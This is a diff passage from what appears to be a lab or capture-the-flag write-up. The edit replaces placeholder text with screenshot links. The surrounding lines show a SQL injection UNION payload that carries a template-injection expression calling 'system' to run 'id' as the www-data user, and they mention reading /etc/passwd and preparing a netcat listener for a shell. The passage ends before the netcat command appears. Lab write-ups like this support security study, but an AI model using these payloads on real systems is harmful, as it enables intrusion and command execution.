@@ -1064,9 +1064,11 @@ The following returned the id of the www-data user
 ```
 cn' UNION SELECT 'Custom Title', 'Custom Author', '{{[\'id\',\"\"]|sort(\'system\')}}', 'Custom Comments' AS new FROM books -- -
 ```
-uid=33(www-data) gid=33(www-data) groups=33(www-data) - insert image
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+![screenshot](id.png)
 
 From here, commands such as ls, pwd, cat /etc/passwd also worked so it was a matter of determining a payload
+![screenshot](passwd.png)
 
 I opted to try netcat and used the following after establishing a listerner on the kali VDI:
 ```
